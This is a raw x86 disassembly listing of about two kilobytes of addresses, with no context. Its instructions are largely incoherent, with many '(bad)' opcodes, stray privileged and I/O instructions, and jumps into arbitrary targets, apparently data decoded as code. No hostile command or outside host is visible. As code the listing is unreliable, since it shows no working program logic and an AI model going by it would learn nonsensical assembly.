  42196a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42196b:	dec    edx
  42196c:	cmp    edi,DWORD PTR [edx+ebp*4]
  42196f:	cs int3 
  421971:	and    DWORD PTR [ebp-0x28],ebp
  421974:	aam    0x59
  421976:	retf   
  421977:	in     al,0x2
  421979:	and    ebx,ebp
  42197b:	push   es
  42197c:	mov    al,0xed
  42197e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42197f:	je     0x4219d7
  421981:	fimul  DWORD PTR [edx]
  421983:	push   ebx
  421984:	inc    edx
  421985:	outs   dx,DWORD PTR ds:[esi]
  421986:	add    al,BYTE PTR [edi+edi*4-0x4f]
  42198a:	jmp    0x421963
  42198c:	xchg   edx,esp
  42198e:	(bad)  
  42198f:	icebp  
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sti    
  421a01:	mov    es,WORD PTR [edx+0x1662487]
  421a07:	add    BYTE PTR [ecx+eax*1],al
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	jecxz  0x4219c4
  421a0e:	fild   QWORD PTR [ecx+0x344c2570]
  421a14:	adc    eax,0x8be560eb
  421a19:	xchg   edi,eax
  421a1a:	cld    
  421a1b:	xchg   esp,eax
  421a1c:	dec    esi
  421a1d:	imul   ebp,ecx,0xfb4fc35a
  421a23:	hlt    
  421a24:	mov    eax,ds:0x7ed85674
  421a29:	sub    edx,DWORD PTR [edi+0x5e989148]
  421a2f:	scas   eax,DWORD PTR es:[edi]
  421a30:	pop    esp
  421a31:	loopne 0x421a8c
  421a33:	mov    es,ebx
  421a35:	sbb    eax,0x9bcd9849
  421a3a:	pop    ebp
  421a3b:	clc    
  421a3c:	cmp    ecx,DWORD PTR [edi+0x6e]
  421a3f:	jo     0x421ab4
  421a41:	mov    ah,0x9e
  421a43:	scas   eax,DWORD PTR es:[edi]
  421a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a45:	or     ebp,edx
  421a47:	icebp  
  421a48:	xchg   DWORD PTR [ebx+0xf0961ee],esi
  421a4e:	xchg   ebp,eax
  421a4f:	sub    ah,BYTE PTR [ecx]
  421a51:	cli    
  421a52:	stos   DWORD PTR es:[edi],eax
  421a53:	jp     0x421a9d
  421a55:	pushf  
  421a56:	aam    0x49
  421a58:	and    eax,0x5c5184d5
  421a5d:	jp     0x421a7a
  421a5f:	pop    es
  421a60:	loope  0x421a03
  421a62:	xchg   DWORD PTR [eax+0x2b],edx
  421a65:	fisttp WORD PTR [esi-0x43fa94a8]
  421a6b:	aad    0xfe
  421a6d:	add    BYTE PTR [eax+0x31],dl
  421a70:	cmp    ebp,DWORD PTR [edi-0x30357aed]
  421a76:	inc    ecx
  421a77:	je     0x421aeb
  421a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a7a:	cmp    BYTE PTR [ecx],ch
  421a7c:	sub    al,0x52
  421a7e:	pop    edi
  421a7f:	fld    TBYTE PTR [edi-0x9]
  421a82:	pop    es
  421a83:	sub    ecx,DWORD PTR [ebx+0x131e9d51]
  421a89:	ror    DWORD PTR [edx+0x49467efc],0x16
  421a90:	(bad)  
  421a91:	push   esp
  421a92:	stc    
  421a93:	adc    al,BYTE PTR [ebx-0x25697073]
  421a99:	jl     0x421ac6
  421a9b:	(bad)  
  421a9c:	call   FWORD PTR [esi+0x4cf661ce]
  421aa2:	rcl    DWORD PTR [esi-0x2b0c1bce],1
  421aa8:	xor    BYTE PTR [ecx],ch
  421aaa:	sbb    ax,0x485e
  421aae:	(bad)  
  421aaf:	in     al,0xb1
  421ab1:	(bad)  
  421ab3:	sbb    al,0x3c
  421ab5:	sub    eax,0xbe01d356
  421aba:	pop    ds
  421abb:	or     eax,0xf1d27cbd
  421ac0:	mov    dh,BYTE PTR [ecx]
  421ac2:	xchg   esp,eax
  421ac3:	pop    edi
  421ac4:	cmc    
  421ac5:	call   0x7de534f2
  421aca:	mov    ch,0xdf
  421acc:	aas    
  421acd:	or     edi,esp
  421acf:	imul   edx,esi,0xfffffff5
  421ad2:	std    
  421ad3:	mov    esp,0x436b49af
  421ad8:	push   0x16754443
  421add:	mov    bl,0xb8
  421adf:	dec    ebp
  421ae0:	outs   dx,BYTE PTR ds:[esi]
  421ae1:	or     bl,bl
  421ae3:	cmp    DWORD PTR [eax-0x6ad6f041],edi
  421ae9:	adc    al,BYTE PTR [edx]
  421aeb:	cmp    al,0x76
  421aed:	push   es
  421aee:	push   0x9f1843a6
  421af3:	test   al,0x59
  421af5:	call   0xd38ed260
  421afa:	jge    0x421aa2
  421afc:	jp     0x421abc
  421afe:	fsub   st(2),st
  421b00:	adc    esi,DWORD PTR [esi+0x6bb48369]
  421b06:	inc    edx
  421b07:	add    BYTE PTR [ebp+0x3],cl
  421b0a:	and    BYTE PTR [edx],al
  421b0c:	ja     0x421b78
  421b0e:	cmp    al,0x78
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     ah,BYTE PTR [eax-0x12]
  421b82:	dec    ebp
  421b83:	ja     0x421bad
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	jb     0x421baf
  421b8e:	retf   
  421b8f:	loopne 0x421b1d
  421b91:	mov    al,ds:0x3c64d384
  421b96:	repnz inc eax
  421b98:	lahf   
  421b99:	jo     0x421be8
  421b9b:	out    dx,eax
  421b9c:	ss js  0x421ba1
  421b9f:	fidivr WORD PTR [ecx-0x52]
  421ba2:	imul   esi,DWORD PTR [ecx],0x58
  421ba5:	xchg   DWORD PTR [ebx+0x382eacd6],edx
  421bab:	xchg   ebp,eax
  421bac:	call   0x5ee1:0x3100d933
  421bb3:	push   0xffffffdf
  421bb5:	push   0x5573da30
  421bba:	lock lds esi,FWORD PTR [edi+esi*1]
  421bbe:	push   ebx
  421bbf:	ins    DWORD PTR es:[edi],dx
  421bc0:	cmp    BYTE PTR [esi],0xe
  421bc3:	lock push ds
  421bc5:	adc    edx,esp
  421bc7:	pop    eax
  421bc8:	fist   WORD PTR [ecx-0x29]
  421bcb:	adc    al,0x97
  421bcd:	repz sbb al,0xe
  421bd0:	adc    edx,DWORD PTR [ecx+ebx*4-0x67]
  421bd4:	(bad)  
  421bd5:	fdiv   QWORD PTR [edi+0x2e]
  421bd8:	mov    WORD PTR ds:0xd28d26df,es
  421bde:	jge    0x421c12
  421be0:	stos   DWORD PTR es:[edi],eax
  421be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421be2:	in     eax,dx
  421be3:	loopne 0x421bed
  421be5:	les    esi,FWORD PTR [edx-0x16]
  421be8:	popa   
  421be9:	mov    edx,0x9d76a915
  421bee:	and    al,cl
  421bf0:	iret   
  421bf1:	xor    DWORD PTR [eax],ecx
  421bf3:	jo     0x421c02
  421bf5:	das    
  421bf6:	fidiv  DWORD PTR [ebx+0x7e]
  421bf9:	jne    0x421bcc
  421bfb:	pop    ss
  421bfc:	xchg   ebx,eax
  421bfd:	popa   
  421bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bff:	mov    ch,0x1b
  421c01:	mov    eax,0xb65a6e78
  421c06:	push   ss
  421c07:	push   ds
  421c08:	scas   al,BYTE PTR es:[edi]
  421c09:	or     DWORD PTR [eax+eax*4-0x76],esi
  421c0d:	jne    0x421bdd
  421c0f:	mov    ds:0x6cc2a67e,eax
  421c14:	fidiv  WORD PTR [ebx+0x11]
  421c17:	into   
  421c18:	out    0xdc,eax
  421c1a:	pop    ss
  421c1b:	mov    dl,0xe3
  421c1d:	call   0xe94c:0x9a2c2555
  421c24:	test   al,0x3e
  421c26:	sbb    eax,0x7a7f9f41
  421c2b:	cs add ebx,esi
  421c2e:	mov    al,0xbd
  421c30:	ret    
  421c31:	xor    al,0x43
  421c33:	dec    edi
  421c34:	lock fxch st(7)
  421c37:	mov    edi,0x8f2113ce
  421c3c:	dec    DWORD PTR [ebx+ebx*4+0x45]
  421c40:	je     0x421cb2
  421c42:	aam    0xb4
  421c44:	pop    esp
  421c45:	sub    al,0xdf
  421c47:	fsubrp st(7),st
  421c49:	xor    DWORD PTR [ecx+ecx*1-0x4cddd888],ecx
  421c50:	aas    
  421c51:	ds mov esi,0x9f126641
  421c57:	mov    al,cl
  421c59:	shl    bh,0x8
  421c5c:	fcomp  st(5)
  421c5e:	inc    esp
  421c5f:	rcl    DWORD PTR [eax],0xa6
  421c62:	(bad)  
  421c64:	mov    ebp,0x298ce6ca
  421c69:	test   DWORD PTR [esi+0x14],ebp
  421c6c:	sti    
  421c6d:	sti    
  421c6e:	push   ebp
  421c6f:	xchg   ebx,eax
  421c70:	daa    
  421c71:	cmp    BYTE PTR [ecx-0x13d60076],bl
  421c77:	test   al,0xa3
  421c79:	popf   
  421c7a:	and    ecx,DWORD PTR [edx-0x3596c6bf]
  421c80:	mov    ebp,0x4394a753
  421c85:	aad    0x69
  421c87:	pop    esp
  421c88:	scas   al,BYTE PTR es:[edi]
  421c89:	mov    ebx,DWORD PTR [ecx-0x7ce3d6c4]
  421c8f:	mov    ds:0x0,eax
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	popa   
  421d01:	push   es
  421d02:	and    al,0x9c
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	fwait
  421d0d:	xchg   ebx,eax
  421d0e:	cmc    
  421d0f:	or     esi,DWORD PTR [bp+si+0x69c1]
  421d14:	dec    esp
  421d15:	dec    edx
  421d16:	lea    edi,[ecx]
  421d18:	out    0x69,al
  421d1a:	std    
  421d1b:	push   cs
  421d1c:	pusha  
  421d1d:	aas    
  421d1e:	pusha  
  421d1f:	stos   BYTE PTR es:[edi],al
  421d20:	jg     0x421d38
  421d22:	std    
  421d23:	arpl   WORD PTR ds:0x873fd375,si
  421d29:	mov    ecx,0x714a3640
  421d2e:	add    BYTE PTR [ebp+0x73de0e80],ah
  421d34:	jo     0x421d1e
  421d36:	in     eax,dx
  421d37:	push   ds
  421d38:	mov    eax,ds:0xa29e9083
  421d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3e:	mov    gs,WORD PTR [esi+ebp*2+0x58]
  421d42:	das    
  421d43:	or     BYTE PTR [edx+0x2194b02a],ah
  421d49:	add    eax,0x2d6fdcbd
  421d4e:	sbb    al,BYTE PTR [di+0x11]
  421d52:	xchg   ecx,eax
  421d53:	mov    al,ds:0x223d4acc
  421d58:	(bad)  
  421d59:	ins    DWORD PTR es:[edi],dx
  421d5a:	or     ah,0xdf
  421d5d:	inc    edi
  421d5e:	xchg   esp,eax
  421d5f:	ret    
  421d60:	push   ss
  421d61:	retf   
  421d62:	jns    0x421d1a
  421d64:	sub    al,0x5d
  421d66:	jg     0x421d3f
  421d68:	lods   eax,DWORD PTR ds:[esi]
  421d69:	pop    ebx
  421d6a:	ins    DWORD PTR es:[edi],dx
  421d6b:	mov    ch,0x89
  421d6d:	icebp  
  421d6e:	daa    
  421d6f:	nop
  421d70:	div    DWORD PTR [ecx+0xc27b6f]
  421d76:	popa   
  421d77:	or     edx,DWORD PTR [ebx-0x1e34fcaf]
  421d7d:	ffree  st(2)
  421d7f:	test   al,0x82
  421d81:	repnz lds ebp,FWORD PTR [ebp+0x5a]
  421d85:	jl     0x421d94
  421d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d88:	bound  esp,QWORD PTR [esi+esi*2-0xe]
  421d8c:	or     eax,0x89055e67
  421d91:	or     BYTE PTR [ebx-0x5498d28f],0x63
  421d98:	pop    esp
  421d99:	std    
  421d9a:	loop   0x421e01
  421d9c:	cld    
  421d9d:	xchg   ecx,eax
  421d9e:	outs   dx,BYTE PTR ds:[esi]
  421d9f:	int3   
  421da0:	jg     0x421d46
  421da2:	pop    esp
  421da3:	adc    dh,dl
  421da5:	ror    BYTE PTR [esp+esi*1+0x3f33d417],1
  421dac:	stos   DWORD PTR es:[edi],eax
  421dad:	nop
  421dae:	dec    edi
  421daf:	pop    esp
  421db0:	jne    0x421dad
  421db2:	int    0xb2
  421db4:	mov    ebp,edi
  421db6:	sti    
  421db7:	inc    esi
  421db8:	xor    DWORD PTR [edx+ebp*2+0x247ac922],ecx
  421dbf:	scas   al,BYTE PTR es:[edi]
  421dc0:	nop
  421dc1:	aas    
  421dc2:	pop    es
  421dc3:	sar    DWORD PTR [ecx],cl
  421dc5:	jbe    0x421d7e
  421dc7:	outs   dx,DWORD PTR ds:[esi]
  421dc8:	test   BYTE PTR [eax+esi*4],dh
  421dcb:	fwait
  421dcc:	pop    ecx
  421dcd:	bound  ebp,QWORD PTR [ecx+ebx*1+0x6635ec72]
  421dd4:	adc    eax,0xc74a2b5c
  421dd9:	shr    BYTE PTR [di-0xc],0x93
  421dde:	jbe    0x421d9d
  421de0:	adc    DWORD PTR [edi-0x15dae4d6],0xd9279458
  421dea:	pusha  
  421deb:	sahf   
  421dec:	inc    esp
  421ded:	jns    0x421dda
  421def:	mov    cl,0xf9
  421df1:	(bad)  
  421df2:	xchg   edi,eax
  421df3:	inc    eax
  421df4:	sbb    eax,0xc16161c6
  421df9:	dec    edx
  421dfa:	cld    
  421dfb:	sub    eax,0x5866da0
  421e00:	mov    DWORD PTR [ebx+0x19],ebx
  421e03:	imul   ecx,DWORD PTR [eax],0x32
  421e06:	test   DWORD PTR [eax-0x35c54126],0xcea83f5
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	cld    
  421e81:	cld    
  421e82:	aaa    
  421e83:	stc    
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	jge    0x421e1c
  421e8e:	push   esi
  421e8f:	xchg   edx,eax
  421e90:	sbb    BYTE PTR es:[edx+0x44640bf9],ch
  421e97:	mov    dl,0xc0
  421e99:	sub    eax,0x245f0c9d
  421e9e:	sub    al,0xaa
  421ea0:	sbb    eax,0xa0ddca34
  421ea5:	xchg   edi,eax
  421ea6:	pop    ss
  421ea7:	in     al,0x47
  421ea9:	adc    BYTE PTR [eax+eax*8-0x4d],0x2b
  421eae:	push   eax
  421eaf:	xor    eax,DWORD PTR [esi-0x33]
  421eb2:	mov    ebp,0x955e3848
  421eb7:	fwait
  421eb8:	mov    esp,0x584c90d8
  421ebd:	in     al,dx
  421ebe:	mov    al,ds:0x5808cde8
  421ec3:	or     al,0xa
  421ec5:	xor    BYTE PTR ds:0xf51d9bd,cl
  421ecb:	out    dx,al
  421ecc:	out    dx,eax
  421ecd:	mov    edi,0xaf8a986b
  421ed2:	xor    BYTE PTR [esi+ebp*8],cl
  421ed5:	xchg   ebx,eax
  421ed6:	jmp    0x421f32
  421ed8:	sub    al,0xc4
  421eda:	shr    BYTE PTR [eax],cl
  421edc:	or     ah,BYTE PTR [edi-0x2391389c]
  421ee2:	mov    ecx,DWORD PTR [edx+edx*1-0x4b54cc2d]
  421ee9:	mov    ch,BYTE PTR ds:0x9961e039
  421eef:	mov    gs,WORD PTR ds:0x791b5d4b
  421ef5:	push   ebx
  421ef6:	dec    eax
  421ef7:	mov    edx,0xd5201478
  421efc:	dec    eax
  421efd:	retf   
  421efe:	jnp    0x421eb9
  421f00:	lods   eax,DWORD PTR ds:[esi]
  421f01:	and    al,0x9f
  421f03:	jne    0x421f3b
  421f05:	imul   ecx,esi,0x483cbcbf
  421f0b:	xchg   DWORD PTR [edx],esp
  421f0d:	xchg   esp,eax
  421f0e:	push   ecx
  421f0f:	in     al,0xf3
  421f11:	cli    
  421f12:	inc    ebx
  421f13:	out    0xc0,eax
  421f15:	mov    bl,0x98
  421f17:	stos   DWORD PTR es:[edi],eax
  421f18:	xor    eax,edi
  421f1a:	das    
  421f1b:	lea    esi,[esi]
  421f1d:	stos   BYTE PTR es:[edi],al
  421f1e:	push   ss
  421f1f:	mov    edx,0x1c8b6729
  421f24:	test   DWORD PTR [edx-0x77],ecx
  421f27:	dec    esp
  421f28:	pop    ecx
  421f29:	outs   dx,DWORD PTR ds:[esi]
  421f2a:	cmp    DWORD PTR [ebx],eax
  421f2c:	out    0x80,eax
  421f2e:	sub    ah,BYTE PTR [eax-0x587b2a6]
  421f34:	pusha  
  421f35:	xor    edi,DWORD PTR [esi+0x2e]
  421f38:	pop    esp
  421f39:	test   eax,0x7cb0f416
  421f3e:	adc    eax,0x50bd006b
  421f43:	mov    ds:0xcc760eb6,al
  421f48:	(bad)
  421f4b:	lods   al,BYTE PTR ds:[esi]
  421f4c:	mov    ds:0x4394ecf,eax
  421f51:	cmp    eax,0xa56aa02a
  421f56:	mov    cl,0x5
  421f58:	jmp    FWORD PTR [ebx+0x12]
  421f5b:	shr    DWORD PTR ds:0xf86a,0xce
  421f61:	fild   WORD PTR [ebx+0x14e03228]
  421f67:	xor    ebx,DWORD PTR [edi+0x5fc426c5]
  421f6d:	int    0x89
  421f6f:	out    0xf8,al
  421f71:	adc    al,BYTE PTR [esi]
  421f73:	test   BYTE PTR [ebx-0x76],0xf
  421f77:	pop    ds
  421f78:	pop    eax
  421f79:	jns    0x421f24
  421f7b:	(bad)  
  421f7c:	fistp  QWORD PTR [ecx]
  421f7e:	icebp  
  421f7f:	mov    ch,dl
  421f81:	rcl    cl,1
  421f83:	and    ch,BYTE PTR [esi]
  421f85:	mov    esi,0x9aa53183
  421f8a:	scas   eax,DWORD PTR es:[edi]
  421f8b:	push   edx
  421f8c:	fadd   DWORD PTR [ebx-0x4f]
  421f8f:	in     eax,0x0
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 sar BYTE PTR [esi+0x6a34d07b],0x1
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	push   ss
  42200d:	or     BYTE PTR [edi-0x194b40d],dh
  422013:	(bad)
  422016:	lds    edi,FWORD PTR [eax-0x5]
  422019:	sub    al,0x88
  42201b:	ss dec esi
  42201d:	or     al,0xcc
  42201f:	imul   dl
  422021:	ret    0x212b
  422024:	(bad)  
  422025:	mov    al,ds:0xbf58f0cd
  42202a:	call   0x4f908268
  42202f:	add    esi,DWORD PTR ds:0x29019de8
  422035:	mov    BYTE PTR [edx+0x5a],0xb4
  422039:	mov    cl,0xaf
  42203b:	xchg   ecx,eax
  42203c:	aad    0xbf
  42203e:	popa   
  42203f:	mov    esp,ds
  422041:	xchg   edx,eax
  422042:	and    dh,bh
  422044:	pop    ebp
  422045:	sub    eax,eax
  422047:	jmp    0x422034
  422049:	mov    ds:0x569a4b4e,eax
  42204e:	mov    esi,0x189bafa0
  422053:	ins    BYTE PTR es:[edi],dx
  422054:	rcr    dl,cl
  422056:	sbb    eax,0x552322f
  42205b:	arpl   sp,di
  42205d:	cmc    
  42205e:	in     al,0x6b
  422060:	jmp    0x42203c
  422062:	add    edx,eax
  422064:	cmp    DWORD PTR [esi+eiz*8],edx
  422067:	popf   
  422068:	dec    DWORD PTR [ecx+0x46]
  42206b:	sbb    DWORD PTR [edi-0x67],0x4041901e
  422072:	add    esp,edx
  422074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422075:	push   ebp
  422076:	retf   0xf6ab
  422079:	scas   al,BYTE PTR es:[edi]
  42207a:	int    0x2b
  42207c:	jne    0x4220b6
  42207e:	mov    fs,WORD PTR [eiz*1+0x41b92e77]
  422085:	mov    cl,0x12
  422087:	sbb    al,0x52
  422089:	sub    esp,DWORD PTR [edi]
  42208b:	xor    ebx,DWORD PTR [ecx-0x35b64dd5]
  422091:	mov    dl,0xdb
  422093:	test   esi,ebp
  422095:	and    al,0xf7
  422097:	ja     0x422042
  422099:	jns    0x4220ed
  42209b:	jbe    0x4220fd
  42209d:	and    dl,0x7c
  4220a0:	enter  0xe9f7,0x87
  4220a4:	pop    esi
  4220a5:	and    al,0xec
  4220a7:	outs   dx,BYTE PTR ds:[esi]
  4220a8:	not    BYTE PTR [ebx]
  4220aa:	stos   BYTE PTR es:[edi],al
  4220ab:	and    al,0x2f
  4220ad:	jp     0x4220a1
  4220af:	sbb    eax,0x3b73db54
  4220b4:	jns    0x42212b
  4220b6:	jp     0x4220d2
  4220b8:	inc    esp
  4220b9:	and    eax,0xe9a5edbc
  4220be:	sub    ebp,ebp
  4220c0:	out    0x4e,eax
  4220c2:	mov    gs,eax
  4220c4:	fist   WORD PTR [edi]
  4220c6:	push   ebp
  4220c7:	aam    0x9b
  4220c9:	in     al,dx
  4220ca:	jmp    0x42213d
  4220cc:	sbb    BYTE PTR [edi-0x5fcd8ed7],dh
  4220d2:	jp     0x4220c8
  4220d4:	frstor [ecx]
  4220d6:	(bad)  [esi-0x16]
  4220d9:	imul   eax,edi,0xdc78d1c0
  4220df:	add    eax,0xa66d5477
  4220e4:	jno    0xa1c3918c
  4220ea:	jns    0x4220e7
  4220ec:	xor    al,0x52
  4220ee:	xchg   esi,eax
  4220ef:	pop    ss
  4220f0:	sbb    al,0xaa
  4220f2:	fstp   QWORD PTR [edx+0x1e]
  4220f5:	mov    DWORD PTR [edx-0x65],ecx
  4220f8:	int    0xb0
  4220fa:	adc    al,0xa
  4220fc:	push   ss
  4220fd:	int3   
  4220fe:	data16 clc 
  422100:	lea    esp,[ecx]
  422102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422103:	ret    
  422104:	push   ebp
  422105:	mov    ds:0x1b8b4c28,al
  42210a:	pop    es
  42210b:	cs push 0xa8b247
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ecx,DWORD PTR [ebx]
  422181:	and    ah,dh
  422183:	scas   al,BYTE PTR es:[edi]
  422184:	cmp    BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	scas   eax,DWORD PTR es:[edi]
  42218d:	in     eax,dx
  42218e:	sbb    esp,DWORD PTR [esi+0x470059fa]
  422194:	pop    ss
  422195:	test   eax,0xa42eae56
  42219a:	lods   eax,DWORD PTR ds:[esi]
  42219b:	(bad)  
  42219c:	test   BYTE PTR gs:[edi],0x66
  4221a0:	cld    
  4221a1:	adc    DWORD PTR [ebx+0x1f],0xefcb6e3d
  4221a8:	xlat   BYTE PTR ds:[ebx]
  4221a9:	in     al,0xaf
  4221ab:	stc    
  4221ac:	daa    
  4221ad:	cmp    edx,DWORD PTR [eax-0x72]
  4221b0:	clc    
  4221b1:	pop    ebx
  4221b2:	mov    al,0x29
  4221b4:	hlt    
  4221b5:	sub    eax,0x1994e0ce
  4221ba:	aas    
  4221bb:	xor    al,0x66
  4221bd:	enter  0x1c24,0xd4
  4221c1:	inc    esp
  4221c2:	add    DWORD PTR ds:0xd337b498,esi
  4221c8:	and    eax,0x76607e45
  4221cd:	cli    
  4221ce:	sub    eax,0x4d1e7396
  4221d3:	mov    dl,0x9
  4221d5:	inc    eax
  4221d6:	cld    
  4221d7:	out    0x17,eax
  4221d9:	arpl   ax,si
  4221db:	jecxz  0x422204
  4221dd:	mov    ch,0x56
  4221df:	mov    dl,0x68
  4221e1:	jae    0x4221c0
  4221e3:	int3   
  4221e4:	jns    0x422186
  4221e6:	ss mov ebp,0x72a90e06
  4221ec:	xor    DWORD PTR [edi-0x27ecff81],0x56
  4221f3:	jp     0x422205
  4221f5:	xor    eax,0x1ff4453e
  4221fa:	push   cs
  4221fb:	push   es
  4221fc:	dec    BYTE PTR [ebx+0x9]
  4221ff:	add    eax,0x2700f30e
  422204:	xchg   edx,eax
  422205:	in     al,0x25
  422207:	popa   
  422208:	stos   BYTE PTR es:[edi],al
  422209:	sahf   
  42220a:	leave  
  42220b:	mov    dl,0x72
  42220d:	jmp    0x51e8:0x4a876b95
  422214:	clc    
  422215:	inc    esp
  422216:	sub    eax,0x5e8c81e7
  42221b:	xchg   BYTE PTR [edi+0x877e66d],bh
  422221:	aam    0xa6
  422223:	mov    eax,0x8b1feba3
  422228:	pushf  
  422229:	jmp    0x4221f2
  42222b:	mov    bl,0xe3
  42222d:	push   eax
  42222e:	pop    eax
  42222f:	adc    DWORD PTR [edx],edi
  422231:	pop    ebp
  422232:	fisub  WORD PTR [ebx]
  422234:	js     0x422213
  422236:	dec    edx
  422237:	jge    0x4221d3
  422239:	loope  0x42221a
  42223b:	jae    0x422257
  42223d:	and    eax,0xcef4a14
  422242:	neg    DWORD PTR [edx-0x52676203]
  422248:	dec    edi
  422249:	data16 int3 
  42224b:	aam    0x6f
  42224d:	ds pushf 
  42224f:	fiadd  WORD PTR [edi]
  422251:	data16 test BYTE PTR [eax],ah
  422254:	sbb    eax,0xccde5cd
  422259:	pop    ebx
  42225a:	push   0xe39195c4
  42225f:	stos   DWORD PTR es:[edi],eax
  422260:	ins    BYTE PTR es:[edi],dx
  422261:	repz popa 
  422263:	mov    dl,0xec
  422265:	call   0x3d07:0x9634a677
  42226c:	mov    ah,0x6b
  42226e:	mov    ecx,0xb889b8da
  422273:	mov    ebp,0x62d5e2ae
  422278:	popf   
  422279:	call   0xbedd:0xa63d4aaf
  422280:	sahf   
  422281:	dec    esp
  422282:	ficom  WORD PTR [ebp-0x467ba4f2]
  422288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422289:	dec    esp
  42228a:	xor    BYTE PTR [eax-0x5956bf3a],dh
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	and    edi,edx
  422302:	or     DWORD PTR [ebx],edx
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	(bad)  
  42230d:	hlt    
  42230e:	mov    eax,0xdf306a25
  422313:	push   edi
  422314:	(bad)  
  422315:	std    
  422316:	cmp    eax,0x393ac4b
  42231b:	test   al,0xc6
  42231d:	in     eax,0x94
  42231f:	cs push edx
  422321:	xchg   DWORD PTR [edx-0x34],esp
  422324:	data16 jge 0x4222ab
  422327:	mov    esi,0xfe31387f
  42232c:	ret    
  42232d:	jae    0x4222e8
  42232f:	inc    esp
  422330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422331:	fidiv  WORD PTR [ecx-0x70beab6c]
  422337:	pop    ecx
  422338:	xlat   BYTE PTR ds:[ebx]
  422339:	inc    ebx
  42233a:	lods   eax,DWORD PTR ds:[esi]
  42233b:	(bad)  [ecx]
  42233d:	bound  eax,QWORD PTR [ecx-0x9]
  422340:	loopne 0x422355
  422342:	pop    ds
  422343:	pusha  
  422344:	push   0xfbc11fa2
  422349:	push   esi
  42234a:	sub    ebp,DWORD PTR ds:0x9689b50d
  422350:	push   ds
  422351:	jnp    0x4222f6
  422353:	mov    edi,0x71a9deb6
  422358:	loopne 0x422365
  42235a:	sti    
  42235b:	jmp    0x42230f
  42235d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42235e:	jge    0x4223d0
  422360:	and    eax,0x751c87d3
  422365:	leave  
  422366:	hlt    
  422367:	dec    eax
  422368:	mov    esi,0x6acd6bea
  42236d:	outs   dx,BYTE PTR ds:[esi]
  42236e:	leave  
  42236f:	jl     0x422388
  422371:	sub    dl,BYTE PTR [eax+0x53]
  422374:	cs test cl,0xdf
  422378:	inc    ebx
  422379:	jp     0x422355
  42237b:	retf   
  42237c:	push   ss
  42237d:	pop    esp
  42237e:	test   al,0x9c
  422380:	fdivr  st,st(6)
  422382:	fnsave [edi]
  422384:	cdq    
  422385:	rcl    DWORD PTR [eax],0x3a
  422388:	dec    ebx
  422389:	and    ah,BYTE PTR [ebp-0x75]
  42238c:	jnp    0x4223da
  42238e:	adc    BYTE PTR [edx+0x6061f0d],dh
  422394:	inc    edx
  422395:	mov    esp,0x18bac9dd
  42239a:	and    eax,0x91acd26b
  42239f:	clc    
  4223a0:	cmp    al,0xff
  4223a2:	jns    0x4223e7
  4223a4:	out    dx,eax
  4223a5:	jne    0x422364
  4223a7:	aad    0x7f
  4223a9:	fadd   DWORD PTR [edx]
  4223ab:	mov    ch,0x79
  4223ad:	cld    
  4223ae:	inc    esp
  4223af:	stos   DWORD PTR es:[edi],eax
  4223b0:	pop    ds
  4223b1:	xchg   ebx,eax
  4223b2:	pop    ds
  4223b3:	cli    
  4223b4:	sar    BYTE PTR [edi],0x7
  4223b7:	out    0xbe,eax
  4223b9:	xor    bl,ah
  4223bb:	in     al,dx
